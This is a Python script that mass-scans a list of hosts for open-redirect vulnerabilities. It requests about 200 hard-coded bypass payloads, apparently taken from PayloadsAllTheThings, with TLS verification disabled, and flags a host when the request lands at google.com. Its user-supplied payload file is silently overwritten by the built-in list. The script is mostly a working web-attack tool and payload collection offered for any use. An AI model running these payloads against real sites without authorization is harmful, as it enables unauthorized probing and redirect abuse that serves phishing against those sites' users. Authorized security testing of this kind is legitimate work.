#!/usr/bin/python3.5

# I don't believe in license.
# You can do whatever you want with this program.

import os
import sys
import re
import time
import random
import argparse
import requests
from urllib.parse import urlparse
from colored import fg, bg, attr
from multiprocessing.dummy import Pool

# disable "InsecureRequestWarning: Unverified HTTPS request is being made."
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def testURL( url ):
    time.sleep( 0.01 )
    t_urlparse = urlparse(url)
    u = t_urlparse.scheme + '_' + t_urlparse.netloc
    if not u in t_exceptions:
        t_exceptions[u] = 0
    if t_exceptions[u] >= 5:
        return
    
    sys.stdout.write( 'progress: %d/%d\r' %  (t_multiproc['n_current'],t_multiproc['n_total']) )
    t_multiproc['n_current'] = t_multiproc['n_current'] + 1

    try:
        r = requests.get( url, timeout=2, verify=False, allow_redirects=True )
    except Exception as e:
        t_exceptions[u] = t_exceptions[u] + 1
        # sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
        return
    
    if 'Content-Type' in r.headers:
        content_type = r.headers['Content-Type']
    else:
        content_type = '-'
    
    if r.url.startswith('https://www.google.com') or r.url.startswith('https://google.com') or r.url.startswith('https://216.58.214.206'):
        vuln = 'VULNERABLE'
    else:
        vuln = '-'

    output = '%sC=%d\t\tL=%d\t\tV=%s\n' %  (url.ljust(t_multiproc['u_max_length']),r.status_code,len(r.text),vuln)
    # sys.stdout.write( '%s' % output )

    fp = open( t_multiproc['f_output'], 'a+' )
    fp.write( output )
    fp.close()

    if str(r.status_code) in t_codes or (_vulnerable is True and vuln == 'VULNERABLE'):
        sys.stdout.write( '%s' % output )


parser = argparse.ArgumentParser()
parser.add_argument( "-p","--payloads",help="set payloads list" )
parser.add_argument( "-o","--hosts",help="set host list (required)" )
# parser.add_argument( "-r","--redirect",help="follow redirection" )
parser.add_argument( "-s","--scheme",help="scheme to use, default=https" )
parser.add_argument( "-e","--code",help="display only status code separated by comma, default=none" )
parser.add_argument( "-t","--threads",help="threads, default 10" )
parser.add_argument( "-v","--vulnerable",help="display vulnerable (overwrite --code)", action="store_true" )
parser.parse_args()
args = parser.parse_args()

if args.scheme:
    _scheme = args.scheme
else:
    _scheme = 'https'

if args.hosts:
    t_hosts = []
    if os.path.isfile(args.hosts):
        fp = open( args.hosts, 'r' )
        t_hosts = fp.readlines()
        fp.close()
    else:
        t_hosts.append( args.hosts )
    n_hosts = len(t_hosts)
    sys.stdout.write( '%s[+] %d hosts found: %s%s\n' % (fg('green'),n_hosts,args.hosts,attr(0)) )
else:
    parser.error( 'hosts list missing' )

if args.payloads:
    t_payloads = []
    if os.path.isfile(args.payloads):
        fp = open( args.payloads, 'r' )
        t_payloads = fp.readlines()
        fp.close()
    else:
        t_payloads.append( args.payloads )
    n_payloads = len(t_payloads)
    sys.stdout.write( '%s[+] %d payloads found: %s%s\n' % (fg('green'),n_payloads,args.payloads,attr(0)) )
else:
    n_payloads = 0

if args.vulnerable:
    _vulnerable = True
else:
    _vulnerable = False

if args.code and not args.vulnerable:
    t_codes = args.code.split(',')
    t_codes_str = ','.join(t_codes)
else:
    t_codes = []
    t_codes_str = 'none'

if args.threads:
    _threads = int(args.threads)
else:
    _threads = 10


redirect_url = 'google.com'


t_totest = []
u_max_length = 0
d_output =  os.getcwd()+'/openredirect'
f_output = d_output + '/' + 'output'
if not os.path.isdir(d_output):
    try:
        os.makedirs( d_output )
    except Exception as e:
        sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
        exit()


sys.stdout.write( '%s[+] options are -> threads:%d, status_code:%s, redirect url:%s%s\n' % (fg('green'),_threads,t_codes_str,redirect_url,attr(0)) )
# sys.stdout.write( "[+] separators:%d, paths:%d, post separators:%d, pre prefixes:%d, prefixes:%d, parameters:%d, suffixes:%d\n" % (len(init_t_separator),len(init_t_path),len(init_t_post_separator),len(init_t_pre_prefix),len(init_t_prefix),len(init_t_parameter),len(init_t_suffix)) )
sys.stdout.write( '[+] computing host and payload list...\n' )

# source: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
t_payloads = [
    '/%09/google.com',
    '/%2f%2fgoogle.com',
    '/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/',
    '/%5cgoogle.com',
    '/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d',
    '/.google.com',
    '//%09/google.com',
    '//%5cgoogle.com',
    '///%09/google.com',
    '///%5cgoogle.com',
    '////%09/google.com',
    '////%5cgoogle.com',
    '/////google.com',
    '/////google.com/',
    '////\;@google.com',
    '////google.com/',
    '////google.com/%2e%2e',
    '////google.com/%2e%2e%2f',
    '////google.com/%2f%2e%2e',
    '////google.com/%2f..',
    '////google.com//',
    '///\;@google.com',
    '///google.com',
    '///google.com/',
    '///google.com/%2e%2e',
    '///google.com/%2e%2e%2f',
    '///google.com/%2f%2e%2e',
    '///google.com/%2f..',
    '///google.com/%2f..;/js',
    '///google.com//',
    '//google.com',
    '//google.com/',
    '//google.com/%2e%2e',
    '//google.com/%2e%2e%2f',
    '//google.com/%2f%2e%2e',
    '//google.com/%2f..',
    '//google.com//',
    '//google%00.com',
    '//google%E3%80%82com',
    '//https:///google.com/%2e%2e',
    '//https://google.com/%2e%2e%2f',
    '//https://google.com//',
    '/<>//google.com',
    '/?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com',
    '/?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redirect_uri=/\/google.com',
    '/?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com',
    '/\/\/google.com/',
    '/\/google.com/',
    '/google.com/%2f%2e%2e',
    '/http://%67%6f%6f%67%6c%65%2e%63%6f%6d',
    '/http://google.com',
    '/http:/google.com',
    '/https:/%5cgoogle.com/',
    '/https://%09/google.com',
    '/https://%5cgoogle.com',
    '/https:///google.com/%2e%2e',
    '/https:///google.com/%2f%2e%2e',
    '/https://google.com',
    '/https://google.com/',
    '/https://google.com/%2e%2e',
    '/https://google.com/%2e%2e%2f',
    '/https://google.com/%2f%2e%2e',
    '/https://google.com/%2f..',
    '/https://google.com//',
    '/https:google.com',
    '/login?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com',
    '/logout?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com',
    '/signin?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com',
    '/signout?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com',
    '/redirect?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com',
    '/redirect?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redir=/\/google.com&rurl=/\/google.com&redirect_uri=/\/google.com',
    '/redirect?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com',
    '////%09/google.com',
    '///%09/google.com',
    '//%09/google.com',
    '/%09/google.com',
    '////%09/www.whitelisteddomain.tld@google.com',
    '///%09/www.whitelisteddomain.tld@google.com',
    '//%09/www.whitelisteddomain.tld@google.com',
    '/%09/www.whitelisteddomain.tld@google.com',
    '/%2f%2fgoogle.com',
    '/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/',
    '////%5cgoogle.com',
    '///%5cgoogle.com',
    '//%5cgoogle.com',
    '/%5cgoogle.com',
    '////%5cwww.whitelisteddomain.tld@google.com',
    '///%5cwww.whitelisteddomain.tld@google.com',
    '//%5cwww.whitelisteddomain.tld@google.com',
    '/%5cwww.whitelisteddomain.tld@google.com',
    '/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d',
    '%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d',
    '//google%00.com',
    '<>//google.com',
    '/<>//google.com',
    '/////google.com',
    '/////google.com/',
    '////\;@google.com',
    '////google.com/',
    '////google.com//',
    '///\;@google.com',
    '///google.com',
    '///google.com/',
    '///google.com//',
    '//google.com',
    '//google.com/',
    '//google.com//',
    '/.google.com',
    '/\/\/google.com/',
    '/\/google.com/',
    '/〱google.com',
    '\/\/google.com/',
    '〱google.com',
    'google.com',
    '////google.com/%2e%2e',
    '///google.com/%2e%2e',
    '//google.com/%2e%2e',
    '////google.com/%2e%2e%2f',
    '///google.com/%2e%2e%2f',
    '//google.com/%2e%2e%2f',
    '////google.com/%2f..',
    '///google.com/%2f..',
    '//google.com/%2f..',
    '////google.com/%2f%2e%2e',
    '///google.com/%2f%2e%2e',
    '//google.com/%2f%2e%2e',
    '/google.com/%2f%2e%2e',
    '//google.com/%2f..;/css',
    '//google.com\@www.whitelisteddomain.tld',
    '//google%E3%80%82com',
    '/http://%67%6f%6f%67%6c%65%2e%63%6f%6d',
    '/http://google.com',
    '/http:/google.com',
    '/https://%09/google.com',
    '/https://%5cgoogle.com',
    '/https:/%5cgoogle.com/',
    '/https://%5cwww.whitelisteddomain.tld@google.com',
    '//https://google.com//',
    '/https://google.com',
    '/https://google.com/',
    '/https://google.com//',
    '/https:google.com',
    '//https:///google.com/%2e%2e',
    '/https:///google.com/%2e%2e',
    '/https://google.com/%2e%2e',
    '//https://google.com/%2e%2e%2f',
    '/https://google.com/%2e%2e%2f',
    '/https://google.com/%2f..',
    '/https:///google.com/%2f%2e%2e',
    '/https://google.com/%2f%2e%2e',
    '//https:///www.google.com/%2e%2e',
    '/https://www.google.com/%2e%2e',
    '//https://www.google.com/%2e%2e%2f',
    '/https:///www.google.com/%2f%2e%2e',
    '/https://www.google.com/%2f%2e%2e',
    '//https://www.whitelisteddomain.tld@google.com//',
    '/https://www.whitelisteddomain.tld@google.com/',
    '/https://www.whitelisteddomain.tld@google.com/%2f..',
    '/https://www.whitelisteddomain.tld@www.google.com/%2e%2e',
    '//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f',
    '/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e',
    '/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e',
    '/login?url=http://google.com&next=http://google.com&redirect=http://google.com&redir=http://google.com&rurl=http://google.com',
    '/logout?url=http://google.com&next=http://google.com&redirect=http://google.com&redir=http://google.com&rurl=http://google.com',
    '/redirect?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com',
    '/redirect?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redir=/\/google.com&rurl=/\/google.com',
    '/redirect?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com',
    '/redirect?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redir=/\/google.com&rurl=/\/google.com&redirect_uri=/\/google.com',
    '/redirect?url=http://google.com&next=http://google.com&redirect=http://google.com&redir=http://google.com&rurl=http://google.com',
    '/redirect?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://',
    '/?url=/\/google.com&next=/\/google.com&redirect=/\/google.com',
    '/?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redirect_uri=/\/google.com',
    '/?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com',
    '/?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com',
    '/?url=http://google.com&next=http://google.com&redirect=http://google.com&redir=http://google.com&rurl=http://google.com',
    '/?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com',
    '////www.google.com/%2e%2e',
    '///www.google.com/%2e%2e',
    '////www.google.com/%2e%2e%2f',
    '///www.google.com/%2e%2e%2f',
    '//www.google.com/%2e%2e%2f',
    '////www.google.com/%2f%2e%2e',
    '///www.google.com/%2f%2e%2e',
    '//www.google.com/%2f%2e%2e',
    '////www.whitelisteddomain.tld@google.com/',
    '////www.whitelisteddomain.tld@google.com//',
    '///www.whitelisteddomain.tld@google.com/',
    '///www.whitelisteddomain.tld@google.com//',
    '//www.whitelisteddomain.tld@google.com/',
    '//www.whitelisteddomain.tld@google.com//',
    '////www.whitelisteddomain.tld@google.com/%2f..',
    '///www.whitelisteddomain.tld@google.com/%2f..',
    '//www.whitelisteddomain.tld@google.com/%2f..',
    '//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e',
    '////www.whitelisteddomain.tld@www.google.com/%2e%2e',
    '///www.whitelisteddomain.tld@www.google.com/%2e%2e',
    '////www.whitelisteddomain.tld@www.google.com/%2e%2e%2f',
    '///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f',
    '//www.whitelisteddomain.tld@www.google.com/%2e%2e%2f',
    '////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e',
    '///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e',
    '//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e',
]


for host in t_hosts:
    for payload in t_payloads:
        host = host.strip()
        payload = payload.replace( 'www.whitelisteddomain.tld', host)
        u = _scheme + '://' + host.strip() + payload
        t_totest.append( u )
        l = len(u)
        if l > u_max_length:
            u_max_length = l


n_totest = len(t_totest)
sys.stdout.write( '%s[+] %d urls created.%s\n' % (fg('green'),n_totest,attr(0)) )
sys.stdout.write( '[+] testing...\n' )


random.shuffle(t_totest)
random.shuffle(t_totest)
# print("\n".join(t_totest))
# exit()

t_exceptions = {}
t_multiproc = {
    'n_current': 0,
    'n_total': n_totest,
    'u_max_length': u_max_length+5,
    'd_output': d_output,
    'f_output': f_output,
    '_vulnerable': _vulnerable,
}

pool = Pool( _threads )
pool.map( testURL, t_totest )
pool.close()
pool.join()
